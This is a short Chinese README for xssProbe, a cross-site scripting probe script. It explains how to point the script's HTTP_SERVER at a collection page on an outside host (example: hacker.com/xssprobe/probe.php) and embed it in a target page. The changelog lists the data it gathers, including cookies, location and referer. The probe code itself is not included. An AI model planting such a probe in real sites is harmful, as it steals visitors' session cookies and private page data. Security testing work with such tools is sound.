#xssProbe

xss探针脚本，用于获取被跨页面的通用数据。

##使用说明：

1. 修改probe.js：
// 获取隐私信息的服务端页面，这里需配置为自己的probe.php网址
HTTP_SERVER = "http://www.hacker.com/xssprobe/probe.php?c=";

2. 在目标页面嵌入probe.js文件，可以参考demo.html（xssprobe demo page）:)

by evilcos@gmail.com

##ChangeLog

### 2011/8/22

  v1 能获取的数据如下：
  
    
> browser, ua, lang, referer, location, topLocation, cookie, domain, title, screen, flash

###2013/12/11

  * 重构代码方便代码压缩
  * 增加对常见js框架（jQuer, ExtJS, dojo, YUI, Prototype等）的版本探测

###2014/04/20

  * 彻底修复 Flash 插件版本探测的问题